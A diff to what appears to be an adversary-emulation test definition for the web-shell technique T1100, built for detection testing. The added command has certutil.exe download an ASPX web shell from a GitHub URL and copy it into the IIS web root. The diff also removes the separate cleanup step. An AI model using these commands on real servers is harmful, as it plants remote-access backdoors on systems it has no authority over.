@@ -15,13 +15,9 @@ atomic_tests:
       description: The path to drop the web shell
       type: string
       default: C:\inetpub\wwwroot
-    web_shells:
-      description: Path of Web Shell
-      type: path
-      default: PathToAtomicsFolder\T1100\src\
   executor:
     name: command_prompt
     command: |
-      xcopy #{web_shells} #{web_shell_path}
-    cleanup_command: |
-      del #{web_shell_path}
+      certutil.exe -urlcache -split -f https://raw.githubusercontent.com/arnoldmw/thremulate/master/art/atomics/T1100/shells/cmd.aspx
+      xcopy cmd.aspx #{web_shell_path}
+      del #{web_shell_path}\cmd.aspx
